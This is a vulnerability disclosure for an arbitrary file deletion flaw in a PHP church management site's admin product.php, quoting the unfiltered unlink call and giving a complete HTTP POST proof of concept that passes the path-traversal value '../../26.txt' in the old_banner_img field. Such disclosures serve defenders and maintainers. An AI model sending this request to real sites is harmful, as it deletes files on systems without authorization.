### Vulnerability file address

In line 70 of `church/admin/app/product.php`, `@unlink("../../assets/images/" . htmlspecialchars($_POST['old_banner_img'], ENT_QUOTES, 'UTF-8'));`,` $_POST['old_banner_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['banner']['tmp_name'] != '') {
            $file_extension = pathinfo($_FILES["banner"]["name"], PATHINFO_EXTENSION);
            $new_filename = uniqid() . '.' . $file_extension;
            $filepath = "../../assets/images/" . $new_filename;

            if (move_uploaded_file($_FILES["banner"]["tmp_name"], $filepath)) {
                $img1 = $new_filename;

                @unlink("../../assets/images/" . htmlspecialchars($_POST['old_banner_img'], ENT_QUOTES, 'UTF-8'));
            }
        }
```

### POC

```http
POST /church/admin/app/product.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 373

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_banner_img"

../../26.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="banner";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `26.txt` file in the `church/` directory

![image-20250505173715571](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051737601.png)



Then we execute the above poc to attack

![image-20250505173819586](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051738619.png)



Files are deleted after the attack is successful

![image-20250505173828451](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051738480.png)